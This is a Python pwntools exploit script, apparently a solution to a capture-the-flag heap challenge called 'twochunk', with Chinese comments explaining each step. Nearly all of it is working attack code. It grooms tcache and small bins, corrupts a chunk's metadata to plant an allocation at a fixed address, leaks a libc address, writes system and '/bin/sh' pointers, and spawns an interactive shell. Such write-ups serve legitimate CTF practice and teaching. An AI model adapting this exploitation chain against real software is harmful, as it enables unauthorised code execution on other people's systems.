# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
#context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './twochunk'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
#libc = ELF('')
context.binary = binary
DEBUG = 1
if DEBUG:
    p = process(binary)
    libc = elf.libc
    #p = process(['qemu-arm', binary])
    #p = process(['qemu-arm', binary,'-g','1234'])
    #p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(
        ['one_gadget','--raw', '-f',filename]
    )).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('choice:',num)

def backdoor():
    cmd(7)

def add(idx , size):
    cmd(1)
    sla('idx' , idx)
    sla('size' , size)

def delete(idx):
    cmd(2)
    sla('idx' , idx)

def show(idx):
    cmd(3)
    sla('idx' , idx)

def edit(idx , content):
    cmd(4)
    sla('idx' , idx)
    sa('content' , content)

def show_name():
    cmd(5)

def get_msg(message):
    cmd(6)
    sla('message' , message)


# one_gad = one_gadget(libc.path)

mmap_addr = 0x23333000

sa('name',p64(mmap_addr + 0x20)*6 )
sla('message','niyah')

for i in range(4):
    add( 0 , 0x88)
    delete(0)
# 后面 malloc 只能 malloc 0x88大小的

for i in range(7):
    add( 0 , 0x188)
    delete(0)
# 这里只有填满 tcache 的作用
# 0x188 大小实际为 0x190 = 0x100 + 0x90

# 其实这道题本质是将small bin 中堆块填到3个

add(0 , 0x188)
add(1 , 0x200)
delete(0)
# 送入 unsorted bin 中
delete(1)

add(0 , 0xf8)
# 切割 unsorted bin 
add(1 , 0x200)
# 将 unsorted bin 剩余0x90大小 chunk 放入 small bin 中
delete(0)
delete(1)



add(0 , 0x188)
add(1 , 0x200)
delete(0)
delete(1)

add(0 , 0xf8)
# 切割 unsorted bin 
add(1 , 0x200)
# 将 unsorted bin 剩余0x90大小 chunk 放入 small bin 中
delete(0)
delete(1)


add(0 , 0x188)
add(1 , 0x200)
delete(0)
delete(1)

add(0 , 0xf8)
add(1 , 0x200)
payload = flat('\x00'*0xf8 , 0x91 , 0 , mmap_addr - 0x10)
edit( 0 , payload )

delete(0)
delete(1)

add(0 , 0x88)

show_name()
leak = l64() - 224 - 0x10
libc.address = leak - libc.sym['__malloc_hook']
system = libc.sym['system']
binsh = libc.search('/bin/sh').next()

lg('leak',leak)

get_msg( p64(system)+ p64(binsh)*8 )

backdoor()

# dbg()


p.interactive()

'''
@File    :   twochunk.py
@Time    :   2021/09/20 23:18:17
@Author  :   Niyah 
'''